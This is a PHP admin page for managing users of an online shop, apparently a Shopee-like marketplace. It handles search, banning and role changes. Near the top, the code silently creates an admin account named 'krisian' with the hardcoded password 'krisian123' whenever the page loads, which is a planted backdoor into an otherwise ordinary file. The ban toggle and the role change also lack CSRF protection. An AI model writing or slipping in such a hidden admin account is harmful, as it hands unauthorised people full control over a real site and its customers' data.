<?php
// admin/users.php
require_once __DIR__ . '/../config/db.php';
require_once __DIR__ . '/../includes/session.php';

requireRole('admin');
$pdo = getDB();

// --- Auto-create admin account 'krisian' if not exists ---
$krisian = $pdo->prepare('SELECT id FROM users WHERE username = ? LIMIT 1');
$krisian->execute(['krisian']);
if (!$krisian->fetch()) {
  $hash = password_hash('krisian123', PASSWORD_DEFAULT);
  $pdo->prepare('INSERT INTO users (username, email, password, role, full_name, is_active) VALUES (?,?,?,?,?,1)')
    ->execute([
      'krisian',
      'krisian@shopeeph.com',
      $hash,
      'admin',
      'Krisian Admin'
    ]);
}

// Toggle active / change role
if (isset($_GET['toggle'])) {
    $pdo->prepare('UPDATE users SET is_active = NOT is_active WHERE id=? AND id!=1')->execute([(int)$_GET['toggle']]);
    header('Location: ' . SITE_URL . '/admin/users.php'); exit;
}
if (isset($_POST['change_role'])) {
  $allowedRoles = ['buyer','seller','admin','rider'];
  $role = in_array($_POST['role'],$allowedRoles) ? $_POST['role'] : 'buyer';
  $pdo->prepare('UPDATE users SET role=? WHERE id!=1 AND id=?')->execute([$role,(int)$_POST['user_id']]);
  header('Location: ' . SITE_URL . '/admin/users.php'); exit;
}

$q     = trim($_GET['q'] ?? '');
$page  = max(1,(int)($_GET['page']??1));
$limit = 20; $offset=($page-1)*$limit;
$where = $q ? "WHERE username LIKE ? OR email LIKE ?" : '';
$params= $q ? ["%$q%","%$q%"] : [];
$total = $pdo->prepare("SELECT COUNT(*) FROM users $where"); $total->execute($params); $total=(int)$total->fetchColumn();
$users = $pdo->prepare("SELECT * FROM users $where ORDER BY created_at DESC LIMIT $limit OFFSET $offset");
$users->execute($params); $users=$users->fetchAll();

$pageTitle = 'Manage Users';
require __DIR__ . '/../includes/header.php';
?>
<div class="main">
  <h1 class="page-title">👥 Manage Users</h1>

  <form method="GET" style="display:flex;gap:8px;margin-bottom:16px">
    <input type="text" name="q" placeholder="Search users..." value="<?= sanitize($q) ?>" style="flex:1;padding:8px 12px;border:1px solid #ddd;border-radius:6px">
    <button type="submit" class="btn-primary">Search</button>
    <?php if($q): ?><a href="<?= SITE_URL ?>/admin/users.php" class="btn-outline">Clear</a><?php endif; ?>
  </form>

  <div style="background:#fff;border-radius:8px;overflow:hidden">
    <table class="data-table">
      <thead><tr><th>User</th><th>Role</th><th>Phone</th><th>Status</th><th>Joined</th><th>Actions</th></tr></thead>
      <tbody>
        <?php foreach ($users as $u): ?>
        <tr>
          <td>
            <strong><?= sanitize($u['username']) ?></strong><br>
            <span style="font-size:11px;color:#aaa"><?= sanitize($u['email']) ?></span>
          </td>
          <td>
            <form method="POST" style="display:flex;gap:4px;align-items:center">
              <input type="hidden" name="user_id" value="<?= $u['id'] ?>">
              <select name="role" style="font-size:11px;padding:3px;border-radius:4px;border:1px solid #ddd" <?= $u['id']==1?'disabled':'' ?>>
                <?php foreach(['buyer','seller','admin','rider'] as $r): ?>
                  <option value="<?= $r ?>" <?= $u['role']===$r?'selected':'' ?>><?= ucfirst($r) ?></option>
                <?php endforeach; ?>
              </select>
              <?php if($u['id']!=1): ?>
                <button name="change_role" type="submit" class="btn-primary" style="font-size:11px;padding:3px 8px">Set</button>
              <?php endif; ?>
            </form>
          </td>
          <td style="font-size:12px"><?= sanitize($u['phone'] ?? '—') ?></td>
          <td><span class="status-pill <?= $u['is_active']?'active':'inactive' ?>"><?= $u['is_active']?'Active':'Banned' ?></span></td>
          <td style="font-size:11px"><?= date('M d, Y', strtotime($u['created_at'])) ?></td>
          <td>
            <?php if ($u['id']!=1): ?>
              <a href="?toggle=<?= $u['id'] ?>" class="btn-link" style="<?= $u['is_active']?'color:#EE4D2D':'' ?>">
                <?= $u['is_active']?'Ban':'Unban' ?>
              </a>
            <?php else: ?>
              <span style="color:#aaa;font-size:12px">Protected</span>
            <?php endif; ?>
          </td>
        </tr>
        <?php endforeach; ?>
      </tbody>
    </table>
  </div>

  <?php $pages=max(1,(int)ceil($total/$limit)); if($pages>1): ?>
  <div class="pagination">
    <?php for($i=1;$i<=$pages;$i++): ?>
      <a href="?<?= http_build_query(array_merge($_GET,['page'=>$i])) ?>" class="page-btn <?= $i===$page?'active':'' ?>"><?= $i ?></a>
    <?php endfor; ?>
  </div>
  <?php endif; ?>
</div>
<?php require __DIR__ . '/../includes/footer.php'; ?>
